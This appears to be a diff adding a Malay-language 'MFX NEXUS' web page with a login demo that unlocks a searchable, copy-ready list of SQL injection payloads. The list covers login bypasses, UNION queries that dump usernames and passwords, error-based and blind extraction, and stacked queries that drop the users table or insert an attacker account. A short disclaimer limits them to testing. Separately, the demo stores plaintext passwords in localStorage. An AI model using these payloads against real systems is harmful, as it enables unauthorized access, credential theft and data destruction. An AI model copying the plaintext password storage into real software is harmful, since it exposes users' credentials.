@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MFX OFFICIAL</title>
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&family=Rajdhani:wght@400;600;700&display=swap');
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  min-height: 100vh;
+  background: #050711;
+  color: white;
+  font-family: 'Rajdhani', sans-serif;
+  overflow-x: hidden;
+}
+
+body::before {
+  content: "";
+  position: fixed;
+  inset: 0;
+  background:
+    linear-gradient(120deg, #071323dd, #09051ddd),
+    url("https://images.unsplash.com/photo-1519608487953-e999c86e7455?w=1600");
+  background-size: cover;
+  background-position: center;
+  z-index: -2;
+}
+
+body::after {
+  content: "";
+  position: fixed;
+  inset: 0;
+  background:
+    linear-gradient(transparent 95%, #00eaff12 96%),
+    linear-gradient(90deg, transparent 95%, #00eaff12 96%);
+  background-size: 35px 35px;
+  pointer-events: none;
+  z-index: -1;
+}
+
+:root {
+  --cyan: #00eaff;
+  --purple: #a855f7;
+}
+
+.container {
+  width: 92%;
+  max-width: 430px;
+  margin: 65px auto;
+}
+
+.logo {
+  text-align: center;
+  font-family: Orbitron;
+  font-size: 28px;
+  color: var(--cyan);
+  text-shadow: 0 0 20px var(--cyan);
+  margin-bottom: 8px;
+}
+
+.subtitle {
+  text-align: center;
+  color: #aaa;
+  letter-spacing: 4px;
+  font-size: 12px;
+  margin-bottom: 25px;
+}
+
+.robot {
+  width: 145px;
+  height: 145px;
+  display: block;
+  margin: 0 auto 20px;
+  border-radius: 50%;
+  object-fit: cover;
+  border: 2px solid var(--cyan);
+  box-shadow: 0 0 25px var(--cyan);
+}
+
+.panel {
+  background: #080e1ceF;
+  border: 1px solid #00eaff66;
+  padding: 30px 23px;
+  border-radius: 12px;
+  box-shadow: 0 0 35px #00eaff18;
+  backdrop-filter: blur(15px);
+}
+
+h2 {
+  text-align: center;
+  font-family: Orbitron;
+  font-size: 19px;
+  margin-bottom: 22px;
+  color: var(--cyan);
+}
+
+input {
+  width: 100%;
+  padding: 14px;
+  margin: 9px 0;
+  background: #101a2a;
+  border: 1px solid #34445b;
+  border-radius: 5px;
+  color: white;
+  outline: none;
+  font-size: 16px;
+}
+
+input:focus {
+  border-color: var(--cyan);
+  box-shadow: 0 0 12px #00eaff44;
+}
+
+.btn {
+  width: 100%;
+  padding: 14px;
+  margin-top: 15px;
+  background: linear-gradient(90deg, #00c8ff, #8b35ff);
+  border: none;
+  border-radius: 5px;
+  color: white;
+  font-family: Orbitron;
+  font-weight: bold;
+  cursor: pointer;
+  transition: .3s;
+}
+
+.btn:hover {
+  box-shadow: 0 0 25px var(--cyan);
+  transform: scale(1.02);
+}
+
+.switch {
+  text-align: center;
+  margin-top: 20px;
+  color: #aaa;
+}
+
+.switch span {
+  color: var(--cyan);
+  cursor: pointer;
+  font-weight: bold;
+}
+
+.hidden {
+  display: none !important;
+}
+
+.message {
+  text-align: center;
+  color: var(--cyan);
+  margin-top: 12px;
+  min-height: 20px;
+}
+
+.dashboard {
+  width: 94%;
+  max-width: 850px;
+  margin: 40px auto;
+}
+
+.top {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  gap: 10px;
+  flex-wrap: wrap;
+  border-bottom: 1px solid #00eaff66;
+  padding-bottom: 20px;
+}
+
+.top h1 {
+  font-family: Orbitron;
+  color: var(--cyan);
+  font-size: 22px;
+}
+
+.welcome {
+  margin: 35px 0;
+  padding: 30px;
+  background: #0b1428eF;
+  border: 1px solid #00eaff66;
+  border-radius: 12px;
+  box-shadow: 0 0 25px #00eaff15;
+}
+
+.welcome h2 {
+  text-align: left;
+  font-size: 23px;
+}
+
+.welcome p {
+  color: #aaa;
+  font-size: 17px;
+}
+
+.cards {
+  display: grid;
+  grid-template-columns: repeat(auto-fit,minmax(180px,1fr));
+  gap: 15px;
+}
+
+.card {
+  padding: 23px;
+  background: #0b1428eF;
+  border: 1px solid #a855f766;
+  border-radius: 10px;
+}
+
+.card h3 {
+  color: var(--cyan);
+  font-family: Orbitron;
+  font-size: 12px;
+}
+
+.card p {
+  font-size: 22px;
+  margin-top: 12px;
+}
+
+.logout {
+  width: auto;
+  padding: 10px 18px;
+  margin: 0;
+  background: #ff2455;
+}
+
+.footer {
+  text-align: center;
+  margin: 35px 0;
+  color: #667;
+  letter-spacing: 2px;
+  font-size: 12px;
+}
+
+/* ===== TAMBAHAN: SECTION SQL INJECTION ===== */
+
+.sql-section {
+  margin-top: 35px;
+  padding: 25px;
+  background: #0b1428eF;
+  border: 1px solid #ff245566;
+  border-radius: 12px;
+  box-shadow: 0 0 25px #ff245515;
+}
+
+.sql-section h2 {
+  text-align: left;
+  color: #ff4d7a;
+  text-shadow: 0 0 15px #ff2455;
+  margin-bottom: 6px;
+}
+
+.sql-desc {
+  color: #aaa;
+  font-size: 15px;
+  margin-bottom: 18px;
+  line-height: 1.5;
+}
+
+.sql-desc b {
+  color: var(--cyan);
+}
+
+.sql-search {
+  width: 100%;
+  padding: 13px;
+  background: #101a2a;
+  border: 1px solid #ff245566;
+  border-radius: 6px;
+  color: white;
+  outline: none;
+  font-size: 15px;
+  margin-bottom: 15px;
+}
+
+.sql-search:focus {
+  border-color: #ff4d7a;
+  box-shadow: 0 0 12px #ff245544;
+}
+
+.payload-item {
+  background: #101a2a;
+  border: 1px solid #34445b;
+  border-left: 4px solid var(--cyan);
+  border-radius: 8px;
+  padding: 15px;
+  margin-bottom: 12px;
+  transition: .25s;
+}
+
+.payload-item:hover {
+  border-left-color: #ff4d7a;
+  box-shadow: 0 0 18px #00eaff22;
+  transform: translateX(3px);
+}
+
+.payload-head {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 8px;
+  flex-wrap: wrap;
+}
+
+.payload-title {
+  font-family: Orbitron;
+  font-size: 13px;
+  color: var(--cyan);
+}
+
+.payload-cat {
+  font-size: 10px;
+  padding: 3px 9px;
+  border-radius: 20px;
+  background: #a855f733;
+  color: #d8b4fe;
+  border: 1px solid #a855f766;
+  letter-spacing: 1px;
+}
+
+.payload-code {
+  display: block;
+  background: #050711;
+  color: #00ff9d;
+  font-family: 'Courier New', monospace;
+  font-size: 13px;
+  padding: 12px;
+  border-radius: 5px;
+  border: 1px solid #00eaff33;
+  word-break: break-all;
+  white-space: pre-wrap;
+  margin-bottom: 10px;
+  text-shadow: 0 0 8px #00ff9d44;
+}
+
+.payload-desc {
+  color: #889;
+  font-size: 13px;
+  margin-bottom: 10px;
+  line-height: 1.5;
+}
+
+.copy-btn {
+  width: auto;
+  padding: 8px 18px;
+  margin: 0;
+  background: linear-gradient(90deg, #00c8ff, #8b35ff);
+  border: none;
+  border-radius: 5px;
+  color: white;
+  font-family: Orbitron;
+  font-size: 11px;
+  font-weight: bold;
+  cursor: pointer;
+  transition: .3s;
+}
+
+.copy-btn:hover {
+  box-shadow: 0 0 20px var(--cyan);
+  transform: scale(1.05);
+}
+
+.copy-btn.copied {
+  background: linear-gradient(90deg, #00ff9d, #00c8ff);
+  color: #050711;
+}
+
+.sql-note {
+  text-align: center;
+  color: #ff4d7a;
+  font-size: 12px;
+  margin-top: 15px;
+  letter-spacing: 1px;
+}
+
+.dev-tag {
+  text-align: center;
+  margin-top: 20px;
+  padding: 14px;
+  background: #101a2a;
+  border: 1px dashed var(--cyan);
+  border-radius: 8px;
+  color: var(--cyan);
+  font-family: Orbitron;
+  font-size: 14px;
+  letter-spacing: 1px;
+  text-shadow: 0 0 12px var(--cyan);
+}
+
+.dev-tag a {
+  color: #ff4d7a;
+  text-decoration: none;
+  font-weight: bold;
+}
+
+.dev-tag a:hover {
+  text-shadow: 0 0 15px #ff4d7a;
+}
+
+</style>
+</head>
+
+<body>
+
+<!-- LOGIN -->
+<div class="container" id="authPage">
+
+  <div class="logo">MFX NEXUS</div>
+  <div class="subtitle">CYBER SECURITY ACCESS SYSTEM</div>
+
+  <img class="robot"
+  src="file_000000005c9882078b512ab3fe539760.png"
+  alt="Cyber robot">
+
+  <div class="panel">
+
+    <!-- LOGIN FORM -->
+    <div id="loginForm">
+      <h2>ACCESS TERMINAL</h2>
+
+      <input id="loginUser" placeholder="Username">
+      <input id="loginPass" type="password" placeholder="Password">
+
+      <button class="btn" onclick="login()">LOGIN SYSTEM</button>
+
+      <div class="switch">
+        Belum ada akaun?
+        <span onclick="showRegister()">REGISTER</span>
+      </div>
+    </div>
+
+    <!-- REGISTER FORM -->
+    <div id="registerForm" class="hidden">
+      <h2>CREATE ACCOUNT</h2>
+
+      <input id="regName" placeholder="Nama penuh">
+      <input id="regUser" placeholder="Username">
+      <input id="regPass" type="password" placeholder="Password">
+
+      <button class="btn" onclick="register()">CREATE ACCOUNT</button>
+
+      <div class="switch">
+        Sudah ada akaun?
+        <span onclick="showLogin()">LOGIN</span>
+      </div>
+    </div>
+
+    <div class="message" id="message"></div>
+  </div>
+
+  <div class="footer">
+    MFX OFFICIAL © 2026
+  </div>
+</div>
+
+
+<!-- DASHBOARD -->
+<div class="dashboard hidden" id="dashboard">
+
+  <div class="top">
+    <h1>MFX NEXUS</h1>
+    <button class="btn logout" onclick="logout()">LOGOUT</button>
+  </div>
+
+  <div class="welcome">
+    <h2>ACCESS GRANTED ✓</h2>
+    <p>Welcome to MFX Cyber Nexus.</p>
+    <p id="welcomeName"></p>
+    <p id="welcomeUser"></p>
+    <p id="welcomeDate"></p>
+  </div>
+
+  <div class="cards">
+
+    <div class="card">
+      <h3>ACCOUNT STATUS</h3>
+      <p>ACTIVE</p>
+    </div>
+
+    <div class="card">
+      <h3>SECURITY LEVEL</h3>
+      <p>LEVEL 01</p>
+    </div>
+
+    <div class="card">
+      <h3>USERNAME</h3>
+      <p id="profileUser"></p>
+    </div>
+
+    <div class="card">
+      <h3>SYSTEM</h3>
+      <p>ONLINE</p>
+    </div>
+
+  </div>
+
+  <div class="welcome">
+    <h2>MISSION CONTROL</h2>
+    <p>Welcome to your private digital workspace.</p>
+    <p>More features coming soon...</p>
+  </div>
+
+  <!-- ===== TAMBAHAN: SECTION SQL INJECTION ===== -->
+  <div class="sql-section">
+
+    <h2>💉 SQL INJECTION PAYLOADS</h2>
+    <p class="sql-desc">
+      Senarai payload SQL Injection untuk tujuan <b>pembelajaran & ujian keselamatan</b>.
+      Klik butang <b>COPY</b> untuk salin payload terus ke clipboard.
+    </p>
+
+    <input class="sql-search" id="sqlSearch" placeholder="🔍 Cari payload / kategori..." oninput="filterPayloads()">
+
+    <div id="payloadList"></div>
+
+    <p class="sql-note">⚠️ GUNA UNTUK UJIAN SAHAJA — JANGAN SALAH GUNA ⚠️</p>
+
+    <div class="dev-tag">
+      DEVELOPER : <a href="https://t.me/ManForceX_Official" target="_blank">@ManForceX_Official</a>
+    </div>
+
+  </div>
+
+  <div class="footer">
+    MFX OFFICIAL | TECHNOLOGY • DIGITAL SOLUTIONS • INNOVATION
+  </div>
+
+</div>
+
+
+<script>
+
+// ===== DATABASE DEMO - LOCAL STORAGE =====
+
+const DB = "mfx_nexus_users";
+const SESSION = "mfx_nexus_session";
+
+function getUsers() {
+  return JSON.parse(localStorage.getItem(DB) || "[]");
+}
+
+function saveUsers(users) {
+  localStorage.setItem(DB, JSON.stringify(users));
+}
+
+function showRegister() {
+  loginForm.classList.add("hidden");
+  registerForm.classList.remove("hidden");
+  message.innerText = "";
+}
+
+function showLogin() {
+  registerForm.classList.add("hidden");
+  loginForm.classList.remove("hidden");
+  message.innerText = "";
+}
+
+function register() {
+
+  const name = regName.value.trim();
+  const username = regUser.value.trim();
+  const password = regPass.value;
+
+  if (!name || !username || !password) {
+    message.innerText = "Sila lengkapkan semua maklumat!";
+    return;
+  }
+
+  if (password.length < 6) {
+    message.innerText = "Password minimum 6 aksara!";
+    return;
+  }
+
+  const users = getUsers();
+
+  if (users.some(u => u.username.toLowerCase() === username.toLowerCase())) {
+    message.innerText = "Username sudah digunakan!";
+    return;
+  }
+
+  users.push({
+    name,
+    username,
+    password
+  });
+
+  saveUsers(users);
+
+  regName.value = "";
+  regUser.value = "";
+  regPass.value = "";
+
+  message.innerText = "ACCOUNT CREATED SUCCESSFULLY!";
+
+  setTimeout(showLogin, 1000);
+}
+
+function login() {
+
+  const username = loginUser.value.trim();
+  const password = loginPass.value;
+
+  const user = getUsers().find(u =>
+    u.username.toLowerCase() === username.toLowerCase()
+    && u.password === password
+  );
+
+  if (!user) {
+    message.innerText = "ACCESS DENIED! LOGIN FAILED.";
+    return;
+  }
+
+  localStorage.setItem(SESSION, user.username);
+
+  loginPass.value = "";
+
+  openDashboard(user);
+}
+
+function openDashboard(user) {
+
+  authPage.classList.add("hidden");
+  dashboard.classList.remove("hidden");
+
+  welcomeName.innerText = "NAME: " + user.name;
+  welcomeUser.innerText = "USER ID: " + user.username;
+  profileUser.innerText = user.username;
+  welcomeDate.innerText = "LOGIN: " + new Date().toLocaleString();
+
+  // Render payload SQL Injection
+  renderPayloads();
+}
+
+function logout() {
+
+  localStorage.removeItem(SESSION);
+
+  dashboard.classList.add("hidden");
+  authPage.classList.remove("hidden");
+
+  showLogin();
+}
+
+function checkSession() {
+
+  const session = localStorage.getItem(SESSION);
+
+  if (!session) return;
+
+  const user = getUsers().find(u => u.username === session);
+
+  if (user) {
+    openDashboard(user);
+  } else {
+    localStorage.removeItem(SESSION);
+  }
+}
+
+// ===== TAMBAHAN: DATA & FUNGSI SQL INJECTION =====
+
+// Senarai payload SQL Injection
+// Boleh TAMBAH / UBAH payload dalam array ni
+const SQL_PAYLOADS = [
+  {
+    title: "Basic OR Injection",
+    category: "LOGIN BYPASS",
+    code: "' OR '1'='1",
+    desc: "Payload klasik untuk bypass login. Buat condition sentiasa true."
+  },
+  {
+    title: "OR 1=1 Comment",
+    category: "LOGIN BYPASS",
+    code: "' OR 1=1 --",
+    desc: "Memaksa query return semua row. Tanda -- comment baki query."
+  },
+  {
+    title: "Admin Bypass",
+    category: "LOGIN BYPASS",
+    code: "admin' --",
+    desc: "Login sebagai admin tanpa password dengan comment kan baki query."
+  },
+  {
+    title: "Union Select Columns",
+    category: "UNION BASED",
+    code: "' UNION SELECT null, null, null --",
+    desc: "Uji bilangan column. Tambah null sehingga tiada error."
+  },
+  {
+    title: "Union Dump User",
+    category: "UNION BASED",
+    code: "' UNION SELECT username, password FROM users --",
+    desc: "Dump username & password dari table users (jika column match)."
+  },
+  {
+    title: "Union Database Version",
+    category: "UNION BASED",
+    code: "' UNION SELECT null, @@version, null --",
+    desc: "Ambil versi database (MySQL)."
+  },
+  {
+    title: "Error Based Extract",
+    category: "ERROR BASED",
+    code: "' AND extractvalue(1, concat(0x7e, database())) --",
+    desc: "Paksa error untuk paparkan nama database (MySQL)."
+  },
+  {
+    title: "Time Based Blind",
+    category: "BLIND SQLI",
+    code: "' OR SLEEP(5) --",
+    desc: "Uji blind SQLi. Jika response delay 5 saat, injection berjaya."
+  },
+  {
+    title: "Boolean Blind",
+    category: "BLIND SQLI",
+    code: "' AND SUBSTRING(@@version,1,1)='8' --",
+    desc: "Uji karakter pertama versi database secara boolean."
+  },
+  {
+    title: "Drop Table (DANGER)",
+    category: "STACKED QUERY",
+    code: "'; DROP TABLE users; --",
+    desc: "Hapus table users. HANYA untuk lab terkawal!"
+  },
+  {
+    title: "Insert Admin",
+    category: "STACKED QUERY",
+    code: "'; INSERT INTO users (username,password) VALUES ('hacker','pwned'); --",
+    desc: "Masukkan admin baru. Hanya untuk lab terkawal."
+  },
+  {
+    title: "Auth Bypass Login",
+    category: "LOGIN BYPASS",
+    code: "username' OR 'x'='x",
+    desc: "Bypass login pada field username."
+  },
+  {
+    title: "Comment Login",
+    category: "LOGIN BYPASS",
+    code: "' OR 1=1 LIMIT 1 --",
+    desc: "Bypass login dengan limit 1 row."
+  },
+  {
+    title: "Order By Column Count",
+    category: "UNION BASED",
+    code: "' ORDER BY 1 --",
+    desc: "Uji bilangan column. Naikkan nombor sehingga error."
+  }
+];
+
+// Render senarai payload
+function renderPayloads(filter = "") {
+
+  const list = document.getElementById("payloadList");
+  if (!list) return;
+
+  const q = filter.toLowerCase().trim();
+
+  const filtered = SQL_PAYLOADS.filter(p =>
+    p.title.toLowerCase().includes(q) ||
+    p.category.toLowerCase().includes(q) ||
+    p.code.toLowerCase().includes(q) ||
+    p.desc.toLowerCase().includes(q)
+  );
+
+  if (filtered.length === 0) {
+    list.innerHTML = '<p style="text-align:center;color:#667;padding:20px;">Tiada payload dijumpai.</p>';
+    return;
+  }
+
+  list.innerHTML = filtered.map((p, i) => {
+    const id = "payload_" + i;
+    return `
+      <div class="payload-item">
+        <div class="payload-head">
+          <span class="payload-title">${p.title}</span>
+          <span class="payload-cat">${p.category}</span>
+        </div>
+        <code class="payload-code" id="${id}">${escapeHtml(p.code)}</code>
+        <p class="payload-desc">${p.desc}</p>
+        <button class="copy-btn" onclick="copyPayload('${id}', this)">📋 COPY</button>
+      </div>
+    `;
+  }).join("");
+}
+
+// Escape HTML untuk keselamatan paparan
+function escapeHtml(str) {
+  return str
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#039;");
+}
+
+// Fungsi copy payload
+function copyPayload(id, btn) {
+
+  const el = document.getElementById(id);
+  if (!el) return;
+
+  const text = el.innerText;
+
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(text).then(() => {
+      showCopied(btn);
+    }).catch(() => {
+      fallbackCopy(text, btn);
+    });
+  } else {
+    fallbackCopy(text, btn);
+  }
+}
+
+// Fallback copy untuk browser lama
+function fallbackCopy(text, btn) {
+  const ta = document.createElement("textarea");
+  ta.value = text;
+  ta.style.position = "fixed";
+  ta.style.opacity = "0";
+  document.body.appendChild(ta);
+  ta.select();
+  try {
+    document.execCommand("copy");
+    showCopied(btn);
+  } catch (e) {
+    alert("Gagal copy. Sila salin manual:\n\n" + text);
+  }
+  document.body.removeChild(ta);
+}
+
+// Papar status "COPIED"
+function showCopied(btn) {
+  const original = btn.innerText;
+  btn.innerText = "✓ COPIED!";
+  btn.classList.add("copied");
+
+  setTimeout(() => {
+    btn.innerText = original;
+    btn.classList.remove("copied");
+  }, 1500);
+}
+
+// Fungsi search payload
+function filterPayloads() {
+  const q = document.getElementById("sqlSearch").value;
+  renderPayloads(q);
+}
+
+checkSession();
+
+</script>
+
+</body>
+</html>
